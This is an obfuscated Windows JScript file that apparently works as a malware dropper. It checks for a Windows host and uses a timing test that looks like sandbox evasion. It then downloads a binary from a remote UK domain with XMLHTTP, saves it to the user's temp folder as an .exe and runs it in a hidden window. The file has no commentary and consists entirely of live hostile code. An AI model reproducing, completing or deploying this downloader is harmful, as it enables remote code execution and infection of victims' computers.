var E = false;
var Yd = "CreateObject";
var O0 = function uO() {return WScript[Yd]("WScript.Shell");}(), K0 = 11;
var pQ = "MSXML2.XMLHTTP";
var ma = 2123213;
var kc = 0;
function R(fi){O0["Run"](fi, kc, kc);};
function M(){return "" + pQ;};
function yn(h1, W0){kc = kc * 1; return h1 - W0;};
function GB(){return Yd;};
/*@cc_on
  @if (@_win32 || @_win64)
    E = true;
  @end
@*/
if (E)
{
var c = "";
function h(){return 22;};
var dr = 0; var kC = 0;
function Bd()
{
var yr = new this["Date"]();
var pl = yr["getUTCMilliseconds"]();
WScript["Sleep"](h());
var yr = new this["Date"]();
var R0 = yr["getUTCMilliseconds"]();
WScript["Sleep"](h());
var yr = new this["Date"]();
var H = yr["getUTCMilliseconds"]();
var dr = "J0";
dr = yn(R0, pl);
var kC = "q";
kC = yn(H, R0);
c = "open";
return yn(dr, kC);
}
var ru = false;
var dF = false;
for (var O = kc; O < h() * 1; O++){if (Bd() != kc){
ru = true; 
kC = "31" + 11 * dr + kC; 
dF = true; 
break;
}}
function J() {return ((ru == true) && (ru == dF)) ? 1 : kc;};
if (ru && J() && dF){
function K() {return O0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ypdqD088Lb.exe";};
 r = M();
 al = WScript[Yd](r);
 var wl = 1;
 while (wl){
try {
al[c]("GET", "http://cngfloristsundries.co.uk/mo4erp", false);
al["send"]();
h0 = "Sleep";
for (;;){WScript[h0](h() * 11); if (al["readystate"] >= 2 * 2) break;};
wl = kc;
} catch(hb){};
}
function u(hj) {var Wg = (1, 2, 3, 4, 5, hj); return Wg;};
W = WScript[GB()]("ADODB.Stream");
r = W;
r[c]();
r["type"] = u(1);
r["write"](al["ResponseBody"]);
W["position"] = u(kc);
r["Save" + "ToFile"](K(), 2);
W["c"+"lose"]();
nw = K();
R(nw);
}
}

